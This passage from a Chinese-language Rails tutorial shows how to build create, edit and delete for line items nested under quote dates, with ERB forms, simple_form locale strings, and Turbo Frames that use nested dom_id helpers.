      redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Item was successfully created."</span></span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:new</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">private</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">line_item_params</span></span>
    params<span class="token punctuation">.</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token symbol">:line_item</span><span class="token punctuation">)</span><span class="token punctuation">.</span>permit<span class="token punctuation">(</span><span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:description</span><span class="token punctuation">,</span> <span class="token symbol">:quantity</span><span class="token punctuation">,</span> <span class="token symbol">:unit_price</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">set_quote</span></span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>find<span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token symbol">:quote_id</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">set_line_item_date</span></span>
    <span class="token variable">@line_item_date</span> <span class="token operator">=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>find<span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token symbol">:line_item_date_id</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还差个局部模板：<code>line_items/new.html.erb and  line_items/_form.html.erb</code>,让我们加上吧</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/new.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>New item <span class="token keyword">for</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> l<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">.</span>date<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>&lt;/h1></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"form"</span></span><span class="token punctuation">,</span>
             <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span><span class="token punctuation">,</span>
             <span class="token symbol">line_item_date</span><span class="token operator">:</span> <span class="token variable">@line_item_date</span><span class="token punctuation">,</span>
             <span class="token symbol">line_item</span><span class="token operator">:</span> <span class="token variable">@line_item</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们不需要给<code>LineItems#new</code> 页面搞一个好样式，我们将后面用Turbo处理表单并插入到<code>Quotes#show</code>页面中。不过，对于使用不支持Turbo的旧浏览器的人来说，它应该还是可以使用的。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/_form.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> simple_form_for <span class="token punctuation">[</span>quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> line_item<span class="token punctuation">]</span><span class="token punctuation">,</span>
                    <span class="token symbol">html</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form line-item line-item--form"</span></span> <span class="token punctuation">&#125;</span> <span class="token keyword">do</span> <span class="token operator">|</span>f<span class="token operator">|</span> <span class="token string-literal"><span class="token string">%>

  &lt;%= form_error_notification(line_item) %></span></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> f<span class="token punctuation">.</span>input <span class="token symbol">:name</span><span class="token punctuation">,</span>
              <span class="token symbol">wrapper_html</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"line-item__name"</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
              <span class="token symbol">input_html</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">autofocus</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= f.input :quantity,
              wrapper_html: &#123; class: "line-item__quantity" &#125; %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> f<span class="token punctuation">.</span>input <span class="token symbol">:unit_price</span><span class="token punctuation">,</span>
              <span class="token symbol">wrapper_html</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"line-item__price"</span></span> <span class="token punctuation">&#125;</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= f.input :description,
              wrapper_html: &#123; class: "line-item__description" &#125; %></span></span>

  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__actions"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Cancel"</span></span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span>quote<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--light"</span></span> <span class="token string-literal"><span class="token string">%>
    &lt;%= f.submit class: "btn btn--secondary" %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在表单中，我们再次使用了<code>form_error_notification</code> helper,这是上一章创建的，我们还再次使用了<code>.line-itme</code>CSS样式，并结合<code>.line-item--form</code></p>
<p>在浏览器中测试一下，但出问题了，line item date消失了，并且通过浏览器控制台看到了下面的异常</p>
<pre class="line-numbers language-none"><code class="language-none">Response has no matching &lt;turbo-frame id&#x3D;&quot;line_item_date_123456&quot;&gt; element<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这是因为”Add item”链接已经嵌入到Turbo Frame中，就像下面的草图</p>
<p><img src="../../../../public/img/image-20230629135429883.png" alt="image-20230629135429883"></p>
<p>这是因为Turbo Frames拦截了所有的链接和表单提交，并且需要一个拥有相同id的响应。我们首先要使我们的CRUD工作没有Turbo Frames和Turbo Streams。</p>
<p>为了防止Turbo拦截提交，我们使用<code>data-turbo-frame=&quot;_top&quot;</code>,在第四章解释过，让我们添加这个参数到链接中</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>

<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item-date__footer"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Add item"</span></span><span class="token punctuation">,</span>
              <span class="token punctuation">[</span><span class="token symbol">:new</span><span class="token punctuation">,</span> quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> <span class="token symbol">:line_item</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
              <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_frame</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"_top"</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
              <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span> <span class="token string-literal"><span class="token string">%>
&lt;/div></span></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了预防相同的问题，我们在”Edit”,”Delete”中也加上相同的参数</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/_line_item.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>

<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__actions"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> button_to <span class="token string-literal"><span class="token string">"Delete"</span></span><span class="token punctuation">,</span>
                <span class="token punctuation">[</span>quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> line_item<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token symbol">method</span><span class="token operator">:</span> <span class="token symbol">:delete</span><span class="token punctuation">,</span>
                <span class="token symbol">form</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_frame</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"_top"</span></span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--light"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;%= link_to "Edit",
              [:edit, quote, line_item_date, line_item],
              data: &#123; turbo_frame: "_top" &#125;,
              class: "btn btn--light" %></span></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在再到浏览器中试试吧</p>
<p>我们花一点儿时间来写按钮，提示等内容</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># config/locales/simple_form.en.yml</span>

<span class="token symbol">en</span><span class="token operator">:</span>
  <span class="token symbol">simple_form</span><span class="token operator">:</span>
    <span class="token symbol">placeholders</span><span class="token operator">:</span>
      <span class="token symbol">quote</span><span class="token operator">:</span>
        <span class="token symbol">name</span><span class="token operator">:</span> Name of your quote
      <span class="token symbol">line_item</span><span class="token operator">:</span>
        <span class="token symbol">name</span><span class="token operator">:</span> Name of your item
        <span class="token symbol">description</span><span class="token operator">:</span> Description <span class="token punctuation">(</span>optional<span class="token punctuation">)</span>
        <span class="token symbol">quantity</span><span class="token operator">:</span> <span class="token number">1</span>
        <span class="token symbol">unit_price</span><span class="token operator">:</span> $<span class="token number">100.00</span>
    <span class="token symbol">labels</span><span class="token operator">:</span>
      <span class="token symbol">quote</span><span class="token operator">:</span>
        <span class="token symbol">name</span><span class="token operator">:</span> Name
      <span class="token symbol">line_item</span><span class="token operator">:</span>
        <span class="token symbol">name</span><span class="token operator">:</span> Name
        <span class="token symbol">description</span><span class="token operator">:</span> Description
        <span class="token symbol">quantity</span><span class="token operator">:</span> Quantity
        <span class="token symbol">unit_price</span><span class="token operator">:</span> Unit price
      <span class="token symbol">line_item_date</span><span class="token operator">:</span>
        <span class="token symbol">date</span><span class="token operator">:</span> Date

  <span class="token symbol">helpers</span><span class="token operator">:</span>
    <span class="token symbol">submit</span><span class="token operator">:</span>
      <span class="token symbol">quote</span><span class="token operator">:</span>
        <span class="token symbol">create</span><span class="token operator">:</span> Create quote
        <span class="token symbol">update</span><span class="token operator">:</span> Update quote
      <span class="token symbol">line_item</span><span class="token operator">:</span>
        <span class="token symbol">create</span><span class="token operator">:</span> Create item
        <span class="token symbol">update</span><span class="token operator">:</span> Update item
      <span class="token symbol">line_item_date</span><span class="token operator">:</span>
        <span class="token symbol">create</span><span class="token operator">:</span> Create date
        <span class="token symbol">update</span><span class="token operator">:</span> Update date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Updating-line-items-without-Turbo"><a href="#Updating-line-items-without-Turbo" class="headerlink" title="Updating line items without Turbo"></a>Updating line items without Turbo</h3><p>现在<code>#new and #create</code>已经正常运转了，类似的，我们开始<code>#edit and #update</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">LineItemsController</span> <span class="token operator">&lt;</span> ApplicationController
  before_action <span class="token symbol">:set_quote</span>
  before_action <span class="token symbol">:set_line_item_date</span>
  before_action <span class="token symbol">:set_line_item</span><span class="token punctuation">,</span> <span class="token symbol">only</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">:update</span><span class="token punctuation">,</span> <span class="token symbol">:destroy</span><span class="token punctuation">]</span>

  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">edit</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">update</span></span>
    <span class="token keyword">if</span> <span class="token variable">@line_item</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>line_item_params<span class="token punctuation">)</span>
      redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Item was successfully updated."</span></span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">private</span>

  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">set_line_item</span></span>
    <span class="token variable">@line_item</span> <span class="token operator">=</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>line_items<span class="token punctuation">.</span>find<span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token symbol">:id</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们知道<code>#destroy</code>也需要<code>set_line_item</code>的回调，所以我们提交加到回调列表中</p>
<p>现在<code>#destroy and #update</code>已经实现了，我们再添加<code>LineItems#edit</code>的视图，以便在浏览器中测试。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/edit.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>Edit item<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"form"</span></span><span class="token punctuation">,</span>
             <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span><span class="token punctuation">,</span>
             <span class="token symbol">line_item_date</span><span class="token operator">:</span> <span class="token variable">@line_item_date</span><span class="token punctuation">,</span>
             <span class="token symbol">line_item</span><span class="token operator">:</span> <span class="token variable">@line_item</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以看到，<code>LineItems#edit</code>页面和<code>LineItems#new</code>页面十分相似，只有标题改动了。现在就可以去浏览器中测试了。在此之后我们还有一件事儿要做。</p>
<h3 id="Deleting-line-items-without-Turbo"><a href="#Deleting-line-items-without-Turbo" class="headerlink" title="Deleting line items without Turbo"></a>Deleting line items without Turbo</h3><p><code>#destroy</code>是最简单的，因为不需要视图，我们只需删除数据，然后重定向到<code>Quotes#show</code>页面。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_items_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItemsController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">destroy</span></span>
    <span class="token variable">@line_item</span><span class="token punctuation">.</span>destroy

    redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Item was successfully destroyed."</span></span>
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在浏览器中测试吧。</p>
<p>我们的增删改查功能都已经完成了，不过我们希望所有的交互都放到相同的页面中，通过Turbo，只需要几行代码就可以切割页面，进行独立的操作。</p>
<h2 id="Adding-Turbo-Frames-and-Turbo-Streams"><a href="#Adding-Turbo-Frames-and-Turbo-Streams" class="headerlink" title="Adding Turbo Frames and Turbo Streams"></a>Adding Turbo Frames and Turbo Streams</h2><h3 id="Creating-line-items-with-Turbo"><a href="#Creating-line-items-with-Turbo" class="headerlink" title="Creating line items with Turbo"></a>Creating line items with Turbo</h3><p>为了理清楚需求，我们再画草图说明。</p>
<p>当用户访问<code>Quotes#show</code>页面，并点击”Add item”按钮，我们希望表单出现在<code>Quotes#show</code>页面上的”Add item”按钮的上面，这里我们使用Turbo Frames，为了生效，我们需要将”Add item”关联到一个空Turbo Frame中，通过<code>data-turbo-frame</code>参数</p>
<p><img src="../../../../public/img/image-20230629212417936.png" alt="image-20230629212417936"></p>
<p>我们发现这次的<code>Turbo Frame ids</code>比之前的章节都长，**<code>Turbo Frames</code> 必须在页面中拥有独立的ids**，而如果页面中有多个日期数据时，我们的空Turbo Frame仅仅使用<code>new_line_item</code>，或者line items列表的id只是<code>line_items</code>,那就会导致多个Turbo Frame拥有了相同的id。</p>
<p>让我们解释一下为什么<strong>同一个页面的Turbo Frames必须要有不同的ids</strong>，如果我们像之前章节那样，我们的<code>create.turbo_stream.erb</code>页面就会像下面的样子：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/create.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>update <span class="token class-name">LineItem</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">""</span></span> <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.append "line_items", @line_item %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果我们的quote有多个<code>line item dates</code>,则<code>Quotes#show</code>页面就会有多个<code>new_line_item and line_items</code>ids。Turbo怎么知道当有多个相同Id时怎么办？而我们新建的<code>line item</code>就插入到错误的日期下面。</p>
<p><strong>一种好的约定，即将我们通常拥有的id前缀设置为父资源的dom_id</strong>，这样就能确保ids唯一。</p>
<p>为了使Turbo正常工作，我们需要在<code>LineItems#new</code>页面上添加一个相同id的Turbo Frame</p>
<p><img src="../../../../public/img/image-20230629213542656.png" alt="image-20230629213542656"></p>
<p>这样当用户点击”New item”按钮时，Turbo将成功用表单替换掉空Turbo Frames</p>
<p><img src="../../../../public/img/image-20230629213715380.png" alt="image-20230629213715380"></p>
<p>当用户提交表单时，我们想让创建的line item被添加到特定日期下的line items列表中。</p>
<p><img src="../../../../public/img/image-20230629213825492.png" alt="image-20230629213825492"></p>
<p>现在需求已经清晰了，我们只需要通过Turbo Frames and Turbo Streams就能解决问题</p>
<p>先开始做第一部分，当用户点击”Add item”按钮时，表单出现在<code>Quotes#show</code>页面，在每个<strong>line item date</strong>上，都加一个空的Turbo Frame去链接”Add date”按钮。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag line_item_date <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="line-item-date"></span></span>
    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item-date__body"</span></span><span class="token operator">></span>
      <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item line-item--header"</span></span><span class="token operator">></span>
        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

      <span class="token operator">&lt;</span><span class="token operator">%=</span> render line_item_date<span class="token punctuation">.</span>line_items<span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> quote<span class="token punctuation">,</span> <span class="token symbol">line_item_date</span><span class="token operator">:</span> line_item_date <span class="token string-literal"><span class="token string">%>

      &lt;%= turbo_frame_tag dom_id(LineItem.new, dom_id(line_item_date)) %></span></span>

      <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item-date__footer"</span></span><span class="token operator">></span>
        <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Add item"</span></span><span class="token punctuation">,</span>
                    <span class="token punctuation">[</span><span class="token symbol">:new</span><span class="token punctuation">,</span> quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> <span class="token symbol">:line_item</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                    <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_frame</span><span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token class-name">LineItem</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">,</span> dom_id<span class="token punctuation">(</span>line_item_date<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                    <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span> <span class="token string-literal"><span class="token string">%>
      &lt;/div></span></span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如上面提到的，对于嵌套资源，我们想用父<code>dom_id</code>作为子<code>dom_id</code>的前缀，<code>dom_id helper</code>用第二个参数作为前缀，我们可以这么写：</p>
<pre class="line-numbers language-none"><code class="language-none">line_item_date &#x3D; LineItemDate.find(1)

dom_id(LineItem.new, dom_id(line_item_date))
# &#x3D;&gt; line_item_date_1_new_line_item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个方法可以奏效，但很难阅读，这里有一种迂回策略</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">dom_id<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"line_items"</span></span><span class="token punctuation">,</span> dom_id<span class="token punctuation">(</span>line_item_date<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># This does not return "line_item_date_1_line_items"</span>
<span class="token comment"># It raises an error as "line_items" does not respond to `#to_key`</span>
<span class="token comment"># and so can't be transformed into a dom_id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>不同于直接依赖<code>dom_id helper</code>，我们创建一个helper去让我们的ids更容易生成或阅读，并确保团队能够使用统一的约定。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/helpers/application_helper.rb</span>

<span class="token keyword">module</span> <span class="token class-name">ApplicationHelper</span>
  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">nested_dom_id</span></span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
    args<span class="token punctuation">.</span>map <span class="token punctuation">&#123;</span> <span class="token operator">|</span>arg<span class="token operator">|</span> arg<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:to_key</span><span class="token punctuation">)</span> <span class="token operator">?</span> dom_id<span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">:</span> arg <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"_"</span></span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过这里的helper，我们就能更简单的生成和阅读我们的<code>dom_ids</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">line_item_date <span class="token operator">=</span> LineItemDate<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

nested_dom_id<span class="token punctuation">(</span>line_item_date<span class="token punctuation">,</span> <span class="token class-name">LineItem</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span>
<span class="token comment"># => line_item_date_1_new_line_item</span>

nested_dom_id<span class="token punctuation">(</span>line_item_date<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"line_items"</span></span><span class="token punctuation">)</span>
